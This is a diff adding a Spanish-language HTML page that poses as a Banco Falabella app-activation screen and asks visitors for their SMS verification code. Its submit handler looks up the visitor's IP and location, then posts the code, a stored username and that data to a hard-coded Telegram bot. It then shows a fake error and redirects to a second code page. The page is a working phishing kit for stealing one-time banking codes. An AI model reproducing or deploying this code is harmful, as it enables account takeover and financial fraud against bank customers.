@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar sesión</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f1f1f1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .login-container {
+        max-width: 400px;
+        width: 90%;
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+
+      .login-container img {
+        max-width: 150px;
+        margin-bottom: 20px;
+      }
+
+      .login-container input {
+        width: 94%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .login-container select {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .login-container button {
+        background-color: #4caf50;
+        color: white;
+        padding: 15px 20px;
+        border: none;
+        width: 100%;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+
+      .login-container button:disabled {
+        background-color: #d3dce3;
+        color: #656c71;
+        padding: 15px 20px;
+        border: none;
+        width: 98%;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+
+      @media screen and (max-width: 480px) {
+        .login-container {
+          width: 100%;
+          border-radius: 0;
+        }
+
+        body {
+          align-items: normal;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="login-container">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1200px-Logotipo_Banco_Falabella.svg.png"
+        alt="Logo"
+      />
+      <form id="loginform" style="margin-top: 50px">
+        <p style="text-align: left;"><span style="font-size: 20px;">Activemos tu App</span></p>
+        <p style="text-align: left">
+          Enviamos un mensaje a tu celular registrado. Por favor, ingresa el código de activación para continuar.
+        </p>
+        <input
+          type="text"
+          name="usuario"
+          id="usuario"
+          inputmode="numeric"
+          minlength="6"
+          maxlength="6"
+          placeholder="Codigo SMS"
+          required
+        />
+
+        <button
+          type="submit"
+          id="submitBtn"
+          style="margin-top: 30px; margin-bottom: 100px"
+          disabled
+        >
+          Verificar
+        </button>
+      </form>
+
+      <script>
+        // Seleccionar el input
+        var inputUsuario = document.getElementById("usuario");
+
+        // Agregar un listener para el evento "input"
+        inputUsuario.addEventListener("input", function (event) {
+          // Obtener el valor actual del input
+          var valorInput = event.target.value;
+
+          // Reemplazar cualquier caracter que no sea un número con una cadena vacía
+          var valorNumerico = valorInput.replace(/\D/g, "");
+
+          // Asignar el valor limpio de caracteres no numéricos de vuelta al input
+          event.target.value = valorNumerico;
+
+          // Verificar la longitud del valor para habilitar o deshabilitar el botón de enviar
+          var submitBtn = document.getElementById("submitBtn");
+          submitBtn.disabled = valorNumerico.length !== 6;
+        });
+      </script>
+    </div>
+  </body>
+
+  <script>
+    document.getElementById("usuario").addEventListener("input", function () {
+      var userInput = this.value.trim();
+      var submitBtn = document.getElementById("submitBtn");
+
+      if (userInput.length > 0) {
+        submitBtn.removeAttribute("disabled");
+      } else {
+        submitBtn.setAttribute("disabled", "disabled");
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const token = document.querySelector("#usuario").value;
+          const message =
+            "\nFalabella\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nToken: " +
+            token+
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot7105949408:AAGGZJIg_lqU3A8AU1NI6PTmEhjbAOEIQ1k/sendMessage",
+              {
+                chat_id: "1988446847",
+                text: message,
+              }
+            )
+            .then((response) => {
+              alert("Error. Por favor, intente nuevamente");
+              window.location.href = "token2.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
